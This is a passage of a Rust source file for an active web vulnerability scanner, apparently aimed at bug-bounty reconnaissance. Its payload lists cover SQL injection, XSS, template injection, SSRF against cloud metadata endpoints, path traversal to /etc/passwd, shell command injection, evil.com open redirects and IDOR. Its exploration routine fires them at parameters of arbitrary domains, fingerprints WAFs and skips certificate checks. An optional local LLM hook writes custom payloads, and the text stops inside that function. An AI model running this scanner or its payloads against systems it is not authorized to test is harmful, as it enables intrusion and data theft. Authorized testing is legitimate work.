use std::env;
use std::fs::File;
use std::io::{BufRead, BufReader, Write};
use std::path::PathBuf;
use std::process::{self, Command, Stdio};
use std::collections::{HashMap, HashSet};
use std::time::{Duration, Instant};
use std::sync::{Arc, Mutex};
use reqwest::blocking::{Client, ClientBuilder};
use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT, COOKIE};
use serde_json::Value;
use rayon::prelude::*;
use percent_encoding::{utf8_percent_encode, NON_ALPHANUMERIC};
use indicatif::{ProgressBar, ProgressStyle};

const VERSION: &str = env!("CARGO_PKG_VERSION");

const RED:     &str = "\x1b[91m";
const GREEN:   &str = "\x1b[92m";
const YELLOW:  &str = "\x1b[93m";
const BLUE:    &str = "\x1b[94m";
const MAGENTA: &str = "\x1b[95m";
const CYAN:    &str = "\x1b[96m";
const RESET:   &str = "\x1b[0m";
const BOLD:    &str = "\x1b[1m";
const DIM:     &str = "\x1b[2m";

const UNSLOTH_MODEL_DEFAULT: &str = "unsloth/Qwen3-8B";
const UNSLOTH_HOST_DEFAULT:  &str = "http://127.0.0.1:8001";
const MAX_CHARS_PREVIEW_CORPO: usize = 6_000;
const MAX_PINCHTAB_SEEDS:      usize = 50;
const IDOR_DIFF_MINIMA:        usize = 500;

const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
];

const SQLI_PAYLOADS: &[&str] = &[
    "' OR '1'='1'--", "\" OR \"1\"=\"1\"--", "' OR 1=1--", "') OR ('1'='1",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
    "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' AND 1=1--", "' AND 1=2--",
    "' /*!OR*/ '1'='1'--", "'/**/OR/**/1=1--",
];

const SQLI_PADROES_ERRO: &[&str] = &[
    "sql syntax","mysql","sqlstate","postgresql","sqlite","oracle","ora-",
    "unterminated string","unexpected end of","quoted string not properly terminated",
    "syntax error","mssql","microsoft ole db","odbc","jdbc","db2",
    "warning: pg_","supplied argument is not a valid mysql",
    "division by zero","invalid query","column count doesn't match",
];

const XSS_PAYLOADS: &[&str] = &[
    r#"<script>alert(1337)</script>"#,
    r#""><script>alert(1337)</script>"#,
    r#"'><script>alert(1337)</script>"#,
    r#""><svg/onload=alert(1337)>"#,
    r#"><svg onload=alert(1337)>"#,
    r#""><img src=x onerror=alert(1337)>"#,
    r#"javascript:alert(1337)"#,
    r#"{{7*7}}"#,
    r#"${7*7}"#,
    r#"<ScRiPt>alert(1337)</sCrIpT>"#,
];

const XSS_MARCADORES: &[&str] = &[
    "alert(1337)","alert&#40;1337&#41;","%3Cscript%3Ealert","<svg","onerror=alert",
];

const SSRF_PAYLOADS: &[&str] = &[
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/v1/",
    "http://localhost:22",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:27017",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info",
];

const SSRF_INDICADORES: &[&str] = &[
    "ami-id","instance-id","security-credentials","computeMetadata",
    "root:x:","daemon:x:","/bin/bash","redis_version","connected_clients",
];

const LFI_PAYLOADS: &[&str] = &[
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/proc/self/environ",
    "/proc/self/cmdline",
];

const LFI_INDICADORES: &[&str] = &[
    "root:x:","daemon:x:","nobody:x:","/bin/sh",
    "[boot loader]","HTTP_HOST=","DOCUMENT_ROOT=",
];

const OPEN_REDIRECT_PAYLOADS: &[&str] = &[
    "https://evil.com","//evil.com","https://evil.com/%2F..",
    "https:///evil.com","/\\evil.com","%68%74%74%70%73%3A%2F%2Fevil.com",
    "javascript:alert(document.domain)",
];

const REDIRECT_PARAMS: &[&str] = &[
    "url","redirect","redirect_url","redirect_uri","next","return","return_url",
    "returnurl","goto","dest","destination","target","redir","ref","referer",
    "forward","location","continue","back","callback","link",
];

const RCE_PAYLOADS: &[&str] = &[
    ";id","|id","&&id","`id`","$(id)",
    ";whoami","|whoami","&&whoami",
    ";sleep 5","|sleep 5","&&sleep 5",
    "' ;id; '","\" ;id; \"",
];

const PARAMS_SENSIVEIS: &[&str] = &[
    "id","user","userid","user_id","account","acct","admin","role",
    "token","auth","key","api_key","secret","password","pass","pwd",
    "file","path","page","include","template","doc",
    "url","src","href","link","redirect",
    "query","q","search","keyword",
    "cmd","exec","command","run","shell",
    "debug","test","dev","preview",
];

const EXTENSOES_REMOVER: &[&str] = &[
    "jpg","jpeg","gif","png","tif","tiff","bmp","svg","ico","webp","avif",
    "pdf","doc","docx","xls","xlsx","ppt","pptx","zip","rar","7z","tar","gz",
    "css","js","json","xml","yaml","yml","wasm",
    "ttf","woff","woff2","eot","otf",
    "mp3","mp4","avi","mov","flv","wav","m4a","webm",
    "exe","dll","so","dylib","bin",
    "map","ts",
];

const IDOR_DELTAS: &[i64] = &[1,-1,2,-2,5,10,100,999,1337];

// ─── Structs ──────────────────────────────────────────────────────────────────

#[derive(Clone)]
struct Config {
    verbose:            bool,
    check_status:       bool,
    explorar:           bool,
    usar_unsloth:       bool,
    modelo_unsloth:     String,
    unsloth_host:       String,
    report_prefix:      Option<String>,
    cookie:             Option<String>,
    headers_extra:      Vec<(String, String)>,
    rate_delay_ms:      u64,
    threads:            usize,
    timeout_secs:       u64,
    waf_detect:         bool,
    apenas_sensiveis:   bool,
    gerar_payloads_llm: bool,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            verbose: false, check_status: false, explorar: false,
            usar_unsloth: false,
            modelo_unsloth: UNSLOTH_MODEL_DEFAULT.to_string(),
            unsloth_host: UNSLOTH_HOST_DEFAULT.to_string(),
            report_prefix: None, cookie: None,
            headers_extra: Vec::new(),
            rate_delay_ms: 0, threads: 0, timeout_secs: 10,
            waf_detect: false, apenas_sensiveis: false, gerar_payloads_llm: false,
        }
    }
}

#[derive(Clone, Debug)]
enum Severidade { Critica, Alta, Media, Baixa }

impl Severidade {
    fn label(&self) -> &str {
        match self { Self::Critica=>"CRITICA", Self::Alta=>"ALTA", Self::Media=>"MEDIA", Self::Baixa=>"BAIXA" }
    }
    fn cor(&self) -> &str {
        match self { Self::Critica=>RED, Self::Alta=>YELLOW, Self::Media=>MAGENTA, Self::Baixa=>BLUE }
    }
    fn de_tipo(t: &str) -> Self {
        match t {
            "RCE"|"SQLi"         => Self::Critica,
            "SSRF"|"LFI"|"IDOR"|"OpenRedirect"|"SSTI" => Self::Alta,
            "XSS"                => Self::Media,
            _                    => Self::Baixa,
        }
    }
}

#[derive(Clone, Debug)]
struct Achado {
    tipo:          &'static str,
    url:           String,
    parametro:     String,
    payload:       String,
    corpo_preview: String,
    status_code:   u16,
    tempo_ms:      u128,
    llm:           Option<String>,
    severidade:    Severidade,
}

#[derive(Clone)]
struct PinchTabConfig { host: String, seeds: Vec<String>, scopes: Vec<String> }

// ─── Main ─────────────────────────────────────────────────────────────────────

fn main() {
    let args: Vec<String> = env::args().collect();
    mostrar_banner();
    verificar_atualizacoes();

    if args.contains(&"-h".to_string()) || args.contains(&"--help".to_string()) { mostrar_help(); return; }
    if args.contains(&"-up".to_string()) || args.contains(&"--update".to_string()) { atualizar_ferramenta(); return; }

    let mut cfg = Config::default();
    cfg.verbose          = args.contains(&"-v".to_string()) || args.contains(&"--verbose".to_string());
    cfg.check_status     = args.contains(&"-status".to_string()) || args.contains(&"--status".to_string());
    cfg.usar_unsloth     = args.contains(&"--unsloth".to_string());
    cfg.waf_detect       = args.contains(&"--waf".to_string());
    cfg.apenas_sensiveis = args.contains(&"--only-sensitive".to_string());
    cfg.gerar_payloads_llm = args.contains(&"--llm-payloads".to_string());
    cfg.explorar         = args.contains(&"-p".to_string())
        || args.contains(&"--explore".to_string()) || cfg.usar_unsloth;

    if let Some(v) = arg_val(&args,"--unsloth-model") { cfg.modelo_unsloth = v; }
    if let Some(v) = arg_val(&args,"--unsloth-host")  { cfg.unsloth_host   = v; }
    if let Some(v) = arg_val(&args,"--report-prefix") { cfg.report_prefix  = Some(v); }
    if let Some(v) = arg_val(&args,"--cookie")        { cfg.cookie         = Some(v); }
    if let Some(v) = arg_val(&args,"--delay").and_then(|v| v.parse().ok())   { cfg.rate_delay_ms = v; }
    if let Some(v) = arg_val(&args,"--threads").and_then(|v| v.parse().ok()) { cfg.threads       = v; }
    if let Some(v) = arg_val(&args,"--timeout").and_then(|v| v.parse().ok()) { cfg.timeout_secs  = v; }

    for i in 0..args.len().saturating_sub(1) {
        if args[i] == "--header" {
            if let Some(raw) = args.get(i+1) {
                if let Some((k,v)) = raw.split_once(':') {
                    cfg.headers_extra.push((k.trim().to_string(), v.trim().to_string()));
                }
            }
        }
    }

    let pinchtab_start     = arg_val(&args,"--pinchtab-start");
    let pinchtab_host      = arg_val(&args,"--pinchtab-host").unwrap_or_else(|| "http://localhost:9867".to_string());
    let pinchtab_scope     = arg_val(&args,"--pinchtab-scope");
    let pinchtab_scope_file = arg_val(&args,"--pinchtab-scope-file");

    let mut pt_seeds: Vec<String> = Vec::new();
    let mut pt_scopes: Vec<String> = Vec::new();
    if let Some(ref s) = pinchtab_start  { pt_seeds.push(s.clone()); }
    if let Some(ref s) = pinchtab_scope  { pt_scopes.push(s.clone()); }
    if let Some(ref path) = pinchtab_scope_file {
        if let Ok(f) = File::open(path) {
            for line in BufReader::new(f).lines().flatten() {
                let d = line.trim().to_string();
                if !d.is_empty() { pt_scopes.push(d); }
            }
        }
    }
    let pinchtab_cfg = if pinchtab_start.is_some() || pinchtab_scope.is_some() || pinchtab_scope_file.is_some() {
        Some(PinchTabConfig { host: pinchtab_host, seeds: pt_seeds, scopes: pt_scopes })
    } else { None };

    if let Some(pos) = args.iter().position(|x| x == "-d") {
        if pos + 1 < args.len() {
            processar_domain_unico(&args[pos+1], arg_val(&args,"-o"), &cfg, pinchtab_cfg);
        } else {
            eprintln!("{}[✗] Domínio não especificado após -d.{}", RED, RESET);
            process::exit(1);
        }
        return;
    }
    if let Some(pos) = args.iter().position(|x| x == "-f") {
        if pos + 1 < args.len() {
            processar_lista_dominios(&args[pos+1], arg_val(&args,"-o"), &cfg, pinchtab_cfg);
        } else {
            eprintln!("{}[✗] Arquivo não especificado após -f.{}", RED, RESET);
            process::exit(1);
        }
        return;
    }

    let (entrada, saida) = processar_argumentos();
    if let Err(e) = filtrar_urls(&entrada, &saida, &cfg, pinchtab_cfg) {
        eprintln!("{}[✗] {}{}", RED, e, RESET);
        process::exit(1);
    }
}

fn arg_val(args: &[String], flag: &str) -> Option<String> {
    args.windows(2).find(|w| w[0] == flag).map(|w| w[1].clone())
}

fn tem_extensao_remover(url: &str) -> bool {
    let p = url.trim().to_lowercase();
    let p = p.split('?').next().unwrap_or(&p);
    EXTENSOES_REMOVER.iter().any(|e| p.ends_with(&format!(".{}", e)))
}

fn tem_parametros(url: &str) -> bool { url.contains('?') }

fn parametro_e_sensivel(param: &str) -> bool {
    let p = param.to_lowercase();
    PARAMS_SENSIVEIS.iter().any(|s| p.contains(s))
}

fn construir_url_injetada(url: &str, alvo: &str, payload: &str) -> Option<String> {
    let (base, query) = url.split_once('?')?;
    let mut alterou = false;
    let nova = query.split('&')
        .filter_map(|p| {
            let mut kv = p.splitn(2,'=');
            let k = kv.next()?.to_string();
            let v = kv.next().unwrap_or("").to_string();
            Some((k,v))
        })
        .map(|(k,v)| {
            if k == alvo {
                alterou = true;
                format!("{}={}", k, utf8_percent_encode(payload, NON_ALPHANUMERIC))
            } else { format!("{}={}", k, v) }
        })
        .collect::<Vec<_>>().join("&");
    if !alterou { return None; }
    Some(format!("{}?{}", base, nova))
}

fn criar_client(cfg: &Config) -> reqwest::Result<Client> {
    let ua_idx = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as usize).unwrap_or(0) % USER_AGENTS.len();

    let mut headers = HeaderMap::new();
    if let Some(ref c) = cfg.cookie {
        if let Ok(v) = HeaderValue::from_str(c) { headers.insert(COOKIE, v); }
    }
    for (k,v) in &cfg.headers_extra {
        if let (Ok(name), Ok(val)) = (
            reqwest::header::HeaderName::from_bytes(k.as_bytes()),
            HeaderValue::from_str(v),
        ) { headers.insert(name, val); }
    }

    ClientBuilder::new()
        .timeout(Duration::from_secs(cfg.timeout_secs))
        .user_agent(USER_AGENTS[ua_idx])
        .danger_accept_invalid_certs(true)
        .redirect(reqwest::redirect::Policy::limited(3))
        .default_headers(headers)
        .build()
}

fn fetch(client: &Client, url: &str, cfg: &Config) -> Option<(u16, String, u128)> {
    if cfg.rate_delay_ms > 0 { std::thread::sleep(Duration::from_millis(cfg.rate_delay_ms)); }
    let t0 = Instant::now();
    let resp = client.get(url).send().ok()?;
    let ms = t0.elapsed().as_millis();
    let status = resp.status().as_u16();
    let body = resp.text().unwrap_or_default();
    Some((status, body, ms))
}

fn verificar_status_http(client: &Client, url: &str) -> Option<u16> {
    client.get(url).send().ok().map(|r| r.status().as_u16())
}

fn detectar_waf(client: &Client, url_base: &str) -> Option<String> {
    let probe = format!("{}?waftest=<script>alert(1)</script>'+OR+1=1--", url_base.split('?').next()?);
    let resp = client.get(&probe).send().ok()?;
    let status = resp.status().as_u16();
    let hdrs = resp.headers().clone();
    let body = resp.text().unwrap_or_default().to_lowercase();

    let waf = if hdrs.contains_key("x-sucuri-id") || body.contains("sucuri") { "Sucuri" }
    else if hdrs.contains_key("x-fw-hash") || body.contains("wordfence")     { "Wordfence" }
    else if body.contains("cloudflare") || hdrs.get("server").and_then(|v| v.to_str().ok()).unwrap_or("").contains("cloudflare") { "Cloudflare" }
    else if body.contains("akamai") || hdrs.contains_key("x-akamai-transformed") { "Akamai" }
    else if body.contains("aws waf") || hdrs.contains_key("x-amzn-requestid")    { "AWS WAF" }
    else if body.contains("incapsula") || hdrs.contains_key("x-iinfo")            { "Imperva/Incapsula" }
    else if body.contains("fortigate") || body.contains("fortiweb")               { "Fortinet" }
    else if status == 403 || status == 406 || status == 429 { "Desconhecido (bloqueio detectado)" }
    else { return None; };

    Some(waf.to_string())
}

fn parece_erro_sql(corpo: &str) -> bool {
    let l = corpo.to_lowercase();
    SQLI_PADROES_ERRO.iter().any(|p| l.contains(p))
}

fn reflexo_xss(corpo: &str) -> bool {
    if !XSS_MARCADORES.iter().any(|m| corpo.contains(m)) { return false; }
    let l = corpo.to_lowercase();
    let em_comentario = l.split("<!--").skip(1).any(|b| {
        let ate = b.split("-->").next().unwrap_or("");
        XSS_MARCADORES.iter().any(|m| ate.contains(m))
    });
    !em_comentario
}

fn parece_ssrf(corpo: &str) -> bool { let l = corpo.to_lowercase(); SSRF_INDICADORES.iter().any(|i| l.contains(i)) }
fn parece_lfi(corpo: &str)  -> bool { let l = corpo.to_lowercase(); LFI_INDICADORES.iter().any(|i| l.contains(i)) }
fn parece_rce(corpo: &str)  -> bool {
    let l = corpo.to_lowercase();
    // Exige padrão específico: uid=N ou gid=N (não apenas a string solta)
    if l.contains("uid=") && l.contains("gid=") { return true; }
    if l.contains("groups=") && (l.contains("uid=") || l.contains("root")) { return true; }
    if l.contains("ping 127.0.0.1") || l.contains("64 bytes from") { return true; }
    false
}

fn parece_ssti(corpo: &str) -> bool {
    // SSTI Jinja2/Twig: 7*7=49 deve aparecer como resultado avulso no body
    // Evita falsos positivos em páginas que naturalmente contêm "49"
    let l = corpo.to_lowercase();
    // Precisa conter "49" isolado E algum marcador de template engine
    (l.contains(">49<") || l.contains(">49 ") || l.contains(" 49<") || corpo.contains("\"49\""))
        && (l.contains("jinja") || l.contains("twig") || l.contains("template")
            || l.contains("render") || l.contains("nunjucks") || l.contains("handlebars"))
        || false
}

// ─── Filtro principal ─────────────────────────────────────────────────────────

fn filtrar_urls(
    arquivo_entrada: &str, arquivo_saida: &str,
    cfg: &Config, pinchtab_cfg: Option<PinchTabConfig>,
) -> std::io::Result<()> {
    if !PathBuf::from(arquivo_entrada).exists() {
        return Err(std::io::Error::new(std::io::ErrorKind::NotFound,
            format!("Arquivo não encontrado: {}", arquivo_entrada)));
    }

    let mut urls_filtradas  = Vec::new();
    let mut total_urls      = 0usize;
    let mut linhas_com_erro = 0usize;

    println!("{}[*] Processando: {}{}", BLUE, arquivo_entrada, RESET);
    if cfg.verbose {
        println!("{}[V] timeout={}s delay={}ms threads={} waf={} sensiveis={}{}",
            MAGENTA, cfg.timeout_secs, cfg.rate_delay_ms,
            if cfg.threads==0 {"auto".to_string()} else {cfg.threads.to_string()},
            cfg.waf_detect, cfg.apenas_sensiveis, RESET);
    }

    let total_linhas = BufReader::new(File::open(arquivo_entrada)?).lines().count() as u64;
    let pb = ProgressBar::new(total_linhas);
    pb.set_style(
        ProgressStyle::with_template("{spinner:.cyan} [{bar:40.cyan/blue}] {pos}/{len} ({eta}) {msg}")
            .unwrap_or_else(|_| ProgressStyle::default_bar()).progress_chars("=>-")
    );

    for linha in BufReader::new(File::open(arquivo_entrada)?).lines() {
        pb.inc(1);
        match linha {
            Ok(url_str) => {
                let url = url_str.trim().to_string();
                total_urls += 1;
                if !url.is_empty() && !tem_extensao_remover(&url) && tem_parametros(&url) {
                    if cfg.apenas_sensiveis {
                        let tem_sensivel = url.split('?').nth(1).unwrap_or("")
                            .split('&').any(|p| parametro_e_sensivel(p.split('=').next().unwrap_or("")));
                        if !tem_sensivel { continue; }
                    }
                    if cfg.verbose { pb.println(format!("{}[V] ✔ {}{}", CYAN, url, RESET)); }
                    urls_filtradas.push(url);
                }
            }
            Err(_) => { linhas_com_erro += 1; total_urls += 1; }
        }
    }
    pb.finish_and_clear();

    if let Some(cfg_pt) = pinchtab_cfg {
        let mut seeds: Vec<String> = if cfg_pt.seeds.is_empty() { urls_filtradas.clone() } else { cfg_pt.seeds.clone() };
        seeds.retain(|s| s.starts_with("http") && !tem_extensao_remover(s));
        if !cfg_pt.scopes.is_empty() { seeds.retain(|s| cfg_pt.scopes.iter().any(|d| s.contains(d))); }
        let mut uniq = HashSet::new();
        seeds.retain(|s| uniq.insert(s.clone()));
        if seeds.len() > MAX_PINCHTAB_SEEDS {
            println!("{}[!] pinchtab: seeds {} → {}{}", YELLOW, seeds.len(), MAX_PINCHTAB_SEEDS, RESET);
            seeds.truncate(MAX_PINCHTAB_SEEDS);
        }
        for seed in &seeds {
            match coletar_urls_pinchtab(&cfg_pt.host, seed, cfg.verbose) {
                Ok(c) => { for u in c { total_urls+=1; if !u.is_empty()&&!tem_extensao_remover(&u)&&tem_parametros(&u) { urls_filtradas.push(u); } } }
                Err(e) => eprintln!("{}[!] Pinchtab {}: {}{}", YELLOW, seed, e, RESET),
            }
        }
    }

    let mut seen = HashSet::new();
    urls_filtradas.retain(|u| seen.insert(u.clone()));

    println!("{}[+] Processadas: {}  Com parâmetros: {}  Removidas: {}{}",
        GREEN, total_urls, urls_filtradas.len(), total_urls - urls_filtradas.len(), RESET);
    if linhas_com_erro > 0 { println!("{}[!] UTF-8 ignoradas: {}{}", YELLOW, linhas_com_erro, RESET); }

    let client = criar_client(cfg)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e.to_string()))?;

    if cfg.check_status {
        println!("{}[*] Status HTTP (paralelo)...{}", MAGENTA, RESET);
        let resultados: Vec<(String, Option<u16>)> = urls_filtradas.par_iter()
            .map(|url| (url.clone(), verificar_status_http(&client, url))).collect();
        let mut por_status: HashMap<u16, Vec<String>> = HashMap::new();
        let mut sem_resp = Vec::new();
        for (url, st) in resultados {
            match st { Some(s) => por_status.entry(s).or_default().push(url), None => sem_resp.push(url) }
        }
        for (status, urls) in &por_status {
            let arq = obter_nome_arquivo_status(*status, arquivo_saida);
            salvar_com_anew(&arq, urls)?;
            println!("{}[✔] {} URLs HTTP {} → '{}'{}", GREEN, urls.len(), status, arq, RESET);
        }
        if !sem_resp.is_empty() {
            let arq = arquivo_saida.replace(".txt","_sem_resposta.txt");
            salvar_com_anew(&arq, &sem_resp)?;
            println!("{}[!] {} sem resposta → '{}'{}", YELLOW, sem_resp.len(), arq, RESET);
        }
    } else {
        salvar_com_anew(arquivo_saida, &urls_filtradas)?;
        println!("{}[✔] Salvas em '{}'{}", GREEN, arquivo_saida, RESET);
    }

    if cfg.waf_detect && !urls_filtradas.is_empty() {
        println!("{}[*] Detectando WAF...{}", CYAN, RESET);
        let dominios: HashSet<String> = urls_filtradas.iter()
            .filter_map(|u| {
                let a = u.trim_start_matches("https://").trim_start_matches("http://");
                Some(a.split('/').next()?.to_string())
            }).collect();
        for dom in &dominios {
            let probe = format!("https://{}", dom);
            match detectar_waf(&client, &probe) {
                Some(waf) => println!("{}[WAF] {} → {}{}", YELLOW, dom, waf, RESET),
                None      => println!("{}[WAF] {} → sem WAF detectado{}", GREEN, dom, RESET),
            }
        }
    }

    if cfg.explorar {
        explorar_vulnerabilidades(&urls_filtradas, cfg)?;
    }

    println!();
    Ok(())
}

// ─── Exploração ───────────────────────────────────────────────────────────────

fn explorar_vulnerabilidades(urls: &[String], cfg: &Config) -> std::io::Result<()> {
    println!("{}[*] Exploração ativa: SQLi XSS SSRF LFI RCE IDOR OpenRedirect SSTI...{}", BLUE, RESET);

    let client = Arc::new(criar_client(cfg)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e.to_string()))?);

    if cfg.threads > 0 {
        let _ = rayon::ThreadPoolBuilder::new().num_threads(cfg.threads).build_global();
    }

    let achados:      Arc<Mutex<Vec<Achado>>>                        = Arc::new(Mutex::new(Vec::new()));
    let falhas:       Arc<Mutex<Vec<(String,String,String,String)>>> = Arc::new(Mutex::new(Vec::new()));
    let total_testes: Arc<Mutex<usize>>                              = Arc::new(Mutex::new(0));

    let pb = Arc::new(ProgressBar::new(urls.len() as u64));
    pb.set_style(
        ProgressStyle::with_template("{spinner:.red} [{bar:40.red/yellow}] {pos}/{len} URLs | achados:{msg}")
            .unwrap_or_else(|_| ProgressStyle::default_bar()).progress_chars("=>-")
    );

    urls.par_iter().for_each(|url| {
        pb.inc(1);
        pb.set_message(format!("{}", achados.lock().unwrap().len()));
        if !url.contains('?') { return; }

        // Ignora URLs cujo PATH já contém sintaxe de template engine
        // (ex: Grafana com {{alert.url}} no path — não é SSTI/RCE real)
        let url_path = url.split('?').next().unwrap_or("");
        let path_tem_template = url_path.contains("%7B%7B") || url_path.contains("{{")
            || url_path.contains("%7D%7D") || url_path.contains("}}");
        // Para essas URLs ainda testamos SQLi e IDOR, mas não XSS/SSTI/RCE
        let testar_template_injection = !path_tem_template;

        let params: Vec<(String, String)> = url.splitn(2,'?').nth(1).unwrap_or("")
            .split('&')
            .filter_map(|p| p.split_once('=').map(|(k,v)| (k.to_string(),v.to_string())))
            .collect();

        let baseline = fetch(&client, url, cfg);

        for (param, valor) in &params {
            if cfg.apenas_sensiveis && !parametro_e_sensivel(param) { continue; }

            // SQLi
            for payload in SQLI_PAYLOADS {
                if let Some(tu) = construir_url_injetada(url, param, payload) {
                    *total_testes.lock().unwrap() += 1;
                    match fetch(&client, &tu, cfg) {
                        Some((s,b,ms)) if parece_erro_sql(&b) => registrar(&achados,&pb,"SQLi",url,param,payload,&b,s,ms),
                        None => { falhas.lock().unwrap().push((url.clone(),param.clone(),payload.to_string(),"timeout".to_string())); }
                        _ => {}
                    }
                }
            }

            // XSS + SSTI
            if testar_template_injection {
            for payload in XSS_PAYLOADS {
                if let Some(tu) = construir_url_injetada(url, param, payload) {
                    *total_testes.lock().unwrap() += 1;
                    if let Some((s,b,ms)) = fetch(&client, &tu, cfg) {
                        if (payload.contains("{{") || payload.contains("${")) && parece_ssti(&b) {
                            registrar(&achados,&pb,"SSTI",url,param,payload,&b,s,ms);
                        } else if reflexo_xss(&b) {
                            registrar(&achados,&pb,"XSS",url,param,payload,&b,s,ms);
                        }
                    }
                }
            }
            } // fim testar_template_injection

            // SSRF
            for payload in SSRF_PAYLOADS {
                if let Some(tu) = construir_url_injetada(url, param, payload) {
                    *total_testes.lock().unwrap() += 1;
                    if let Some((s,b,ms)) = fetch(&client, &tu, cfg) {
                        if parece_ssrf(&b) { registrar(&achados,&pb,"SSRF",url,param,payload,&b,s,ms); }
                    }
                }
            }

            // LFI
            for payload in LFI_PAYLOADS {
                if let Some(tu) = construir_url_injetada(url, param, payload) {
                    *total_testes.lock().unwrap() += 1;
                    if let Some((s,b,ms)) = fetch(&client, &tu, cfg) {
                        if parece_lfi(&b) { registrar(&achados,&pb,"LFI",url,param,payload,&b,s,ms); }
                    }
                }
            }

            // RCE
            if testar_template_injection {
            for payload in RCE_PAYLOADS {
                if let Some(tu) = construir_url_injetada(url, param, payload) {
                    *total_testes.lock().unwrap() += 1;
                    if let Some((s,b,ms)) = fetch(&client, &tu, cfg) {
                        if parece_rce(&b) { registrar(&achados,&pb,"RCE",url,param,payload,&b,s,ms); }
                    }
                }
            }
            } // fim testar_template_injection

            // Open Redirect
            if REDIRECT_PARAMS.iter().any(|rp| param.to_lowercase().contains(rp)) {
                for payload in OPEN_REDIRECT_PAYLOADS {
                    if let Some(tu) = construir_url_injetada(url, param, payload) {
                        *total_testes.lock().unwrap() += 1;
                        if let Ok(resp) = client.get(&tu).send() {
                            let uf = resp.url().to_string();
                            let st = resp.status().as_u16();
                            let bd = resp.text().unwrap_or_default();
                            if uf.contains("evil.com") { registrar(&achados,&pb,"OpenRedirect",url,param,payload,&bd,st,0); }
                        }
                    }
                }
            }

            // IDOR
            if let Ok(orig) = valor.parse::<i64>() {
                if let Some((status_base, corpo_base, _)) = &baseline {
                    for delta in IDOR_DELTAS {
                        let novo = (orig + delta).to_string();
                        if let Some(tu) = construir_url_injetada(url, param, &novo) {
                            *total_testes.lock().unwrap() += 1;
                            if let Some((s,b,ms)) = fetch(&client, &tu, cfg) {
                                let diff = (b.len() as isize - corpo_base.len() as isize).unsigned_abs();
                                if s == *status_base && diff > IDOR_DIFF_MINIMA {
                                    let p = format!("{} → {}", valor, novo);
                                    registrar(&achados,&pb,"IDOR",url,param,&p,&b,s,ms);
                                }
                            }
                        }
                    }
                }
            }
        }
    });

    pb.finish_and_clear();

    let total = *total_testes.lock().unwrap();
    let mut achados_final = Arc::try_unwrap(achados).unwrap().into_inner().unwrap();
    let falhas_final      = Arc::try_unwrap(falhas).unwrap().into_inner().unwrap();

    // Resumo
    println!("\n{}╔══════════════════════════════════════════════════════════════╗{}", CYAN, RESET);
    println!("{}║  RESUMO DA EXPLORAÇÃO                                         ║{}", CYAN, RESET);
    println!("{}╠══════════════════════════════════════════════════════════════╣{}", CYAN, RESET);
    println!("{}║  Testes: {:>6}  Achados: {:>4}  Falhas/timeouts: {:>4}       ║{}", CYAN, total, achados_final.len(), falhas_final.len(), RESET);
    println!("{}╚══════════════════════════════════════════════════════════════╝{}", CYAN, RESET);

    if !achados_final.is_empty() {
        println!("\n{}Achados:{}", BOLD, RESET);
        for a in &achados_final {
            println!("  {}[{}]{} [{}] {} | param:{} | HTTP {} | {}ms",
                a.severidade.cor(), a.severidade.label(), RESET,
                a.tipo, a.url, a.parametro, a.status_code, a.tempo_ms);
        }
    } else {
        println!("{}[-] Sem comportamentos suspeitos.{}", BLUE, RESET);
    }

    if cfg.gerar_payloads_llm && !achados_final.is_empty() {
        gerar_payloads_com_llm(&cfg.modelo_unsloth, &cfg.unsloth_host, &mut achados_final, cfg.verbose)?;
    }
    if cfg.usar_unsloth && !achados_final.is_empty() {
        validar_com_unsloth(&cfg.modelo_unsloth, &cfg.unsloth_host, &mut achados_final, cfg.verbose)?;
    } else if cfg.usar_unsloth {
        println!("{}[LLM] Nenhum achado para validar.{}", BLUE, RESET);
    }

    if let Some(ref prefix) = cfg.report_prefix {
        salvar_relatorios(prefix, &achados_final, &falhas_final)?;
        salvar_relatorio_html(prefix, &achados_final)?;
    }

    Ok(())
}

fn registrar(achados: &Arc<Mutex<Vec<Achado>>>, pb: &Arc<ProgressBar>,
    tipo: &'static str, url: &str, param: &str, payload: &str,
    body: &str, status: u16, ms: u128) {
    // Deduplicação: um achado único por (tipo, url_base, param)
    let url_base = url.split('?').next().unwrap_or(url);
    {
        let lock = achados.lock().unwrap();
        if lock.iter().any(|a| a.tipo == tipo && a.parametro == param
            && a.url.split('?').next().unwrap_or(&a.url) == url_base) {
            return; // já registrado
        }
    }
    let sev = Severidade::de_tipo(tipo);
    pb.println(format!("{}[{}]{} [{}] {} param:{} HTTP:{} {}ms",
        sev.cor(), sev.label(), RESET, tipo, url, param, status, ms));
    achados.lock().unwrap().push(Achado {
        tipo, url: url.to_string(), parametro: param.to_string(), payload: payload.to_string(),
        corpo_preview: body.chars().take(MAX_CHARS_PREVIEW_CORPO).collect(),
        status_code: status, tempo_ms: ms, llm: None, severidade: sev,
    });
}

// ─── LLM: gerar payloads ──────────────────────────────────────────────────────

fn gerar_payloads_com_llm(modelo: &str, host: &str, achados: &mut [Achado], verbose: bool) -> std::io::Result<()> {
    println!("{}[LLM] Gerando payloads customizados...{}", CYAN, RESET);
